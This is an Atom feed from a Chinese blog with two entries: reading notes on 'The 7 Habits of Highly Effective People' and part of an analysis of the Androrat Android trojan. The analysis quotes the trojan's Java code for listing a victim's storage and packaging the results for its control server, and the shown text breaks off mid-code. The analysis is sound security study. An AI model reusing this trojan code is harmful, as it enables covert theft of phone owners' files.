<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>奇门遁甲</title>
 <link href="http://localhost:4000/atom.xml" rel="self"/>
 <link href="http://localhost:4000/"/>
 <updated>2017-04-09T12:56:41+08:00</updated>
 <id>http://localhost:4000</id>
 <author>
   <name>唐三</name>
   <email></email>
 </author>

 
 <entry>
   <title>《高效能人士的七个习惯》读书笔记</title>
   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2017/04/09/%E9%AB%98%E6%95%88%E8%83%BD%E4%BA%BA%E5%A3%AB%E7%9A%84%E4%B8%83%E4%B8%AA%E4%B9%A0%E6%83%AF-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0.html"/>
   <updated>2017-04-09T12:05:34+08:00</updated>
   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2017/04/09/《高效能人士的七个习惯》读书笔记</id>
   <content type="html">&lt;p&gt;重读《高效能人士的七个习惯》，收获颇丰。&lt;/p&gt;

&lt;h2 id=&quot;第三章-积极主动&quot;&gt;第三章 积极主动&lt;/h2&gt;

&lt;p&gt;人有选择对客观环境回应的自由，不会被外界条件所控制。积极主动的人会根据自己的价值观选择对外界刺激的回应方式。&lt;/p&gt;

&lt;p&gt;越痛苦的经历，越能磨练意志，开发潜能，提升自如应对困境的能力。逆境往往能激发思维转换，以全新的观点看待世界、自己与他人，审视生命的意义，进而思考如何回应，这种宽广的视角就是可以提升和激励所有人的态度价值观。&lt;/p&gt;

&lt;p&gt;人性的本质是主动的。人类不仅能针对特定环境选择回应方式，更能创造有利环境，人们需要认识到自己有责任创造条件。太多人只是坐等命运的安排或贵人相助，事实上，任何事情都是靠自己争取而来的。靠推卸责任，让别人替他收拾残局，是消极被动的表现。&lt;strong&gt;我们有能力以积极态度应对现状和未来，逃避这一现实，就只能被动地让环境和条件决定一切。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;推诿责任的言语往往会强化宿命论，我们应尽量避免使用这样的言语，把“如果”句式变成“我可以”句式。&lt;/p&gt;

&lt;p&gt;我们应当把大部分注意力放在我们的影响圈中，做我们力所能及的事情，这样慢慢的我们的影响圈就会扩大。否则，过度注意关注圈的内容，会让我们过于消极，感慨客观条件对自己的限制太多。&lt;/p&gt;

&lt;p&gt;每种选择背后必然有选择它所带来的后果，如果选择出现错误，导致出现不好的后果（但这并不是积极主动地问题），我们应当及时的承认错误，认识错误，为避免以后出现相同错误做出总结。当然选择之前仔细如果能自己的思考，会很大程度的避免错误的选择。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;作出承诺和信守承诺是影响圈的核心力量&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;第四章-以终为始&quot;&gt;第四章 以终为始&lt;/h2&gt;

&lt;p&gt;领导是指出正确的方向，管理是做正确的到达目标的事。为自己的人生确立以正确原则为宗旨的目标，可以指导之后行为的方向。这是一件为自己人生设计剧本的过程，能够帮助我们不在被动的度过碌碌无为的一声。在制定目标时，我们可以使用，拓宽思路（转换视角，如自己想象自己的葬礼上，朋友会对自己有怎样的评价）和心灵演练的右脑方式。&lt;/p&gt;

&lt;p&gt;制定个人使命宣言是设计这个剧本不错的方式，通过为自己的角色和目标罗列清单，能够更清晰的确定目标。当然，家庭、企业和组织都是可以设定使命宣言的，但是前提一定是所有成员一起制定，这样才能让所有人认同的执行。&lt;/p&gt;

&lt;h2 id=&quot;第五章-要事第一&quot;&gt;第五章 要事第一&lt;/h2&gt;

&lt;p&gt;自我管理的实质就是自律和条理，是对计划的实施。忠于自己的价值观、目标和使命，对所有其它不相关的事说“不”，不屈服于一时的冲动和欲望。&lt;/p&gt;

&lt;p&gt;将大部分精力分配给第二类事物（重要但不紧急：建立人际关系、规化长期目标、锻炼身体等），避免第三类（不重要但紧急：接无关紧要的电话、回复不重要的邮件等）和第四类事物（不重要不紧急：看综艺、玩手机等），这样可以有效的减少第一类事物的出现（重要且紧急）。&lt;/p&gt;

&lt;p&gt;以周为单位进行个人计划的四个步骤：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;确认角色，写出自己下周所要担任的各种关键角色&lt;/li&gt;
  &lt;li&gt;选择目标，写出下一周中每个角色最想做的一两件事，最好大多数是第二类事物并且与自己的长远目标相关联&lt;/li&gt;
  &lt;li&gt;安排进度，为每一个目标安排执行时间&lt;/li&gt;
  &lt;li&gt;每日调整，根据突发事件、崭新机会适当调整执行时间，只要把握原则，任何调整都心安理得。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;贯穿自我管理方法的一条主线是，&lt;strong&gt;将人际交往和效果放在第一位，时间放在第二位&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;授权可以比亲力亲为的效能高上10倍甚至更多，责任型授权效果远好于指令性授权，授权方式可以参考双赢协议的指导方法。&lt;/p&gt;

&lt;h2 id=&quot;第六章-人际关系的本质&quot;&gt;第六章 人际关系的本质&lt;/h2&gt;

&lt;p&gt;所谓情感账户，存储的是人际关系或缺的“信赖”，也就是他人与你相处时的一分安全感。能够增加情感账户存款的是，礼貌、诚实、仁慈与信用。反之，粗鲁、轻蔑、威逼与失信，会降低感情账户余额。&lt;/p&gt;

&lt;p&gt;建立和维护关系都需要时间，速战速决是不切实际的。如果因为他反应冷淡或者不以为然就不耐烦起来，就会前功尽弃。当然保持耐心很难，不但需要积极的态度，还要对影响圈有所关注，要循序渐进，切忌为了获得真相而破坏事物本身。建立和维持人际关系是一种长期的投资行为。&lt;/p&gt;

&lt;p&gt;六种主要的投资方式：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;理解他人，理解他人是一切感情的基础，只有了解并真心接纳对方，才可以增进彼此的关系。有时在你看来微不足道的小事，在对方眼里可能是天下第一重要的事情。所以我们需要认同旁人的观念与价值，并以对方的需要为优先考虑加以配合&lt;/li&gt;
  &lt;li&gt;注意小节，一些看似无关紧要的小节，如疏忽礼貌，不经意的失言，最能消耗情感账户的存款。在人际关系中，最重要的正是这些小事。&lt;/li&gt;
  &lt;li&gt;信守承诺，守信是一大笔储蓄，背信则是庞大的支出，代价往往超出其他任何过失。不轻易许诺，许过就一定要兑现。所以许诺前一定要再三思量，小心谨慎，把所有的可能都考虑到，以免因为一些突发状况而无法兑现诺言。如果发生意外导致承诺无法兑现，要么坚持执行，要么向当事人解释无法兑现的原因，直至对方允许我从诺言中脱身。&lt;/li&gt;
  &lt;li&gt;明确期望,几乎所有的人际关系障碍都源于对角色和目标的期望不明或者意见不一致。期望不明会导致误会，失望和信用度降低。很多期望都是含蓄的，从来没有明白的说出来过，但是人们都相当然的认为这些事是心照不宣的，实际情况并非如此。正确的做法是一开始就提出明确的期望，让相关的每一个人都了解，要做到这一点需要投入很多的时间和精力，但是事实会想你证明这都是值得的。&lt;/li&gt;
  &lt;li&gt;正直诚信，正直诚信能够产生信任，也是其他感情投资的基础。诚信，即诚实守信，既要有一说一，又要信守承诺、履行约定。而表现这种品格的最好方法就是避免背后攻击他人。如果能对不在场的人保持尊重，在场的人也会尊重你。闲言闲语是人的通病，不同流合污，反而显得格格不入，好在日久见人心，诚恳坦荡中回应的信任。&lt;/li&gt;
  &lt;li&gt;勇于致歉，当我们从情感账户上提款时，要向对方诚心致歉，那会帮我们增加存款。这种勇气只有鉴定自持、深具安全感的人能够做到。缺乏自信的人为空道歉会显得软弱，让自己受伤，使别人得寸进尺。还不如把过错归咎于人，反而更容易些。真诚的道歉是一种感情投资，但是一歉再歉就显得不真诚。动机不良或企图文过饰非的行为，是不会得到宽恕的。&lt;/li&gt;
  &lt;li&gt;无条件的爱，无条件的爱可以给人安全感与自信心，鼓励个人肯定自我，追求成长，由于不附带任何条件，没有任何牵绊，被爱者得以用自己的方式，检验人生种种美好的境界。不过无条件的付出并不代表软弱。我们依然有原则、有限度、有是非观念，只是无损于爱心。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;”为一个人完全奉献自己，胜过为拯救全世界而拼命。“为群体服务远不及建立私人关系需要更多的人格修养。&lt;/p&gt;

&lt;p&gt;问题的反面是契机&lt;/p&gt;

&lt;p&gt;如果父母能把孩子身上的问题看作联络感情的机会，而不是麻烦和负担，那么两代人之间的关系就会大大改善，父母会更愿意，甚至是迫切地理解并帮助孩子。当孩子带着问题来求助时，父母不会大呼：“天啊，又怎么了！”而是想：“瞧，我又有机会帮助孩子了，我们的关系会更进一步。”于是交流成了促进感情的工具，而不是简单地敷衍。当孩子感受重视的时候，亲子之间就建起了一座爱与信任的坚实桥梁。&lt;/p&gt;

&lt;p&gt;同样的模式在商业领域也有重要的作用，有一个连锁百货商店就是这样树立信誉的，只要顾客为了问题而来，不论多小，商店职员都是指为客户建立关系的良机，会积极而热情的寻求解决途径，知道顾客满意。他们礼貌而周到的服务让顾客认定了这家商店，不在作他想。&lt;/p&gt;

&lt;p&gt;在相互依赖的环境里，如果认识到产出/产能平衡市效能的要素，我们就可以把问题看作是提高产能的机会。&lt;/p&gt;

&lt;p&gt;如何在海量问题中发现重要问题？大海捞针？&lt;/p&gt;

&lt;h2 id=&quot;第七章-双赢思维&quot;&gt;第七章 双赢思维&lt;/h2&gt;

&lt;p&gt;双赢模式是六种人际交往模式中最好的一种，可以得到双方都满意的结果。如果在交往的过程中无法达到双赢模式，那么最好在最开始的阶段就选择好聚好散，否则共事过程中会不断积累矛盾直至爆发。在某些环境中可能不太适合好聚好散的退出，那么可以考虑妥协、独善其身的模式临时应对，但是这样会消耗我们情感账户的存款，慎之慎之。&lt;/p&gt;

&lt;p&gt;双赢模式是以情感账户存款为根基的，情感账户充足他人才能信任我们，和我们共同商讨双赢方案。双赢品德有三个特征：诚信，信守承诺，不会朝令夕改；成熟，就是在表达自己的情感和信念的同时又能体谅他人的想法和感受的能力，敢作敢为和善解人意期间的平衡点是成熟的重要标志，如果我足够成熟，我就会&lt;strong&gt;善于聆听&lt;/strong&gt;，&lt;strong&gt;乐于沟通&lt;/strong&gt;，&lt;strong&gt;勇于面对&lt;/strong&gt;；知足，相信资源充足人人有份，公众领域的成功不是压倒旁人，而是通过有效交往让所有参与者获利，大家一起工作，一起探讨，一起实现单枪匹马无法完成的理想，拥有富足心态的人，不怕与人共名声、共财势，从而开启无限的可能性，充分发挥创造力，并提供宽广的选择空间。&lt;/p&gt;

&lt;p&gt;双赢协议要素：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;预期结果：确认目标和实现&lt;/li&gt;
  &lt;li&gt;指导方针：确认目标实现的原则、方针和行为限度&lt;/li&gt;
  &lt;li&gt;可用资源&lt;/li&gt;
  &lt;li&gt;任务考核：建立业绩评估标准和时间&lt;/li&gt;
  &lt;li&gt;奖惩制度：根据任务考核确认奖惩的意义&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;自我评估更能激人上进，在高度信任的文化氛围里，自我评估的结果更精确，因为当事人往往最清楚实际进度，自我观察远远比旁人的观察和测量要准确。&lt;/p&gt;

&lt;p&gt;原则性谈判的关键是要将人同问题区分开来，要注重利益而不是立场，要创造出足够让对方都获利的方法，但不为被双方认同的一些原则或标准。&lt;/p&gt;

&lt;p&gt;双赢过程分为以下几步：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;从对方角度看问题&lt;/li&gt;
  &lt;li&gt;认清主要问题和顾虑（而非立场）&lt;/li&gt;
  &lt;li&gt;确定大家都能接受的结果&lt;/li&gt;
  &lt;li&gt;实现这种结果的各种可能途径&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;双赢协议的注意力要放在结果而不是方法上，双赢协议意味着自由，但必须以诚信作为支持，否则即便已经签署，也只能半途而废。&lt;/p&gt;

&lt;h2 id=&quot;第八章-知彼解己&quot;&gt;第八章 知彼解己&lt;/h2&gt;

&lt;p&gt;移情聆听，感受对方讲话内容时的心情，并让自己也带上这份心情去理解对方表达的内容，可以更好的发现问题的重点。然后使用理性分析，发现造成问题的根本原因，站在对方的立场，以对方的心情来表述问题的原因，提出解决办法。聆听的过程中应避免下面四种“自传式回应”：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;价值判断，对旁人的意见只有接受和不接受&lt;/li&gt;
  &lt;li&gt;追根究底，依自己的价值观探查被人的隐私&lt;/li&gt;
  &lt;li&gt;好为人师，以自己的经验提供忠告&lt;/li&gt;
  &lt;li&gt;自以为是，根据自己的行为动机衡量别人的行为与动机&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;表达自己在双赢中也是很重要的，但表达自己并不是自吹自擂，而是根据对他人的了解来诉说自己的意见，有时甚至会改变初衷。因为在了解别人的过程中，你也产生了新的见解。&lt;/p&gt;

&lt;p&gt;你应该时刻想着先理解别人，这是你力所能及的。深入的了解对方，你就会获得准确的信息，能迅速抓住事件的核心，建立自己的情感账户，还能给对方提供有效合作所必需的“心里空气”。你越深入了解别人，就会越欣赏和尊重他们。出击对方的灵魂是一件很神圣的事情。&lt;/p&gt;

&lt;h2 id=&quot;第九章-综合统效&quot;&gt;第九章 综合统效&lt;/h2&gt;

&lt;p&gt;综合统效的基本心理是：如果一位具有相当聪明才智的人跟我意见不同，那么对方的主张必定有我尚未体会得到的奥妙，值得加以了解。与人合作最重要的是，重视不同个体的不同心理、情绪与智能，以及个人眼中所见到的不同世界。假如两人意见相同，其中一人必属多余。与所见略同的人沟通，毫无益处，要有分歧才有收获。&lt;/p&gt;

&lt;p&gt;综合统效可以达成1+1远远大于2的目标，但前提是我们能够做到判断和尊重差异，取长补短。不同视角、想法的人在一起，能够碰撞出前所未见的创造力，不过这种创造的结果有时会是失败的，但我们不要因为失败而变得保守，放弃综合统效这个很棒的方法。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;凡是创新就得承担，不怕失败，不断尝试错误。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;综合统效遵循双赢思维，使用移情聆听，双方坦诚沟通，终能够找到非彼即此之外的第三条路。完全没有必要将时间和精力耗费在玩弄权术、唇枪舌剑、彼此提防、争权夺势和放马后炮等消极无益的事情上。&lt;/p&gt;

&lt;p&gt;虚怀若谷的人承认自己有不足之处，而乐于在与人交往中汲取丰富的知识见解，重视不同意见，进而增广见闻。&lt;/p&gt;

&lt;h2 id=&quot;第十章-不断更新&quot;&gt;第十章 不断更新&lt;/h2&gt;

&lt;p&gt;对自己投资是我们一生中所做的最有效投资，需要从身体、智力、精神和社会/情感四方面&lt;strong&gt;均衡&lt;/strong&gt;进行。身体更新，需要耐力、韧性和力量。精神更新，需要舒适的空间放松和思考，人和人并不相同，有的人通过欣赏优秀的音乐作品进行，有的人通过祈祷，有的人通过冥想。智力更新，智能手机、电视等消磨时间的内容是会损耗我们的智力，应避免把过多的时间放在上面，养成定期阅读优秀文学作品的习惯，养成写作的习惯记录自己的想法、经历、学习心得和深刻见解，养成对事情开始前的组织规划的习惯，都有助于完成智力层面的更新。社会/情感更新，通过习惯四、五、六在生活中不断练习沟通交流，完成更新。&lt;/p&gt;

&lt;p&gt;每天花至少一小时的时间完成这四方面的更新，会让你更好的迎接明天的挑战。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>剖析安卓木马Androrat（终）</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E7%BB%88.html"/>
   <updated>2017-04-09T02:06:34+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/04/09/剖析安卓木马Androrat（终）</id>
   <content type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;

&lt;p&gt;前面的两篇文章已经将Androrat的主要功能和处理方式分析的差不多了，这篇文章来做一些收尾的工作，将之前没有说的命令执行结果发送至服务端的数据封装过程分析一下，以及这个应用的执行结构图。&lt;/p&gt;

&lt;h2 id=&quot;0x01-返回数据封装分析&quot;&gt;0x01 返回数据封装分析&lt;/h2&gt;

&lt;p&gt;以列出目录树这个功能为例，ProcessCommand这部分功能的代码如下：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;commande&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;LIST_DIR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendInformation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;List directory request received&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DirLister&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;listDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Directory: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; not found&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;commande&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GET_FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;调用DirLister.listDir这个方法来实现列目录功能，参数为当前环境的Client对象，解析数据后的channel和执行命令所需的参数（这里是“/”）。下面我们来看listDir的代码:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;listDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientListener&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MyFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MyFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;();&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExternalStorageDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;ar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;visitAllDirsAndFiles&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;handleData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileTreePacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;大都是执行功能的代码，就不多说了。我们直接来看倒数第二行，将执行结果先通过FileTreePacket的build进行转换，转换为Byte数组的形式，然后通过Client的handleData方法实现封装和传输。handleData中只有一行调用Connection的sendData方法，这个方法也是一行，调用了Mux的send方法。我们直接来看Mux的send的代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;TransportPacket&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envoieTotal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pointeurData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numSeq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actualLenght&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envoieTotal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
			&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
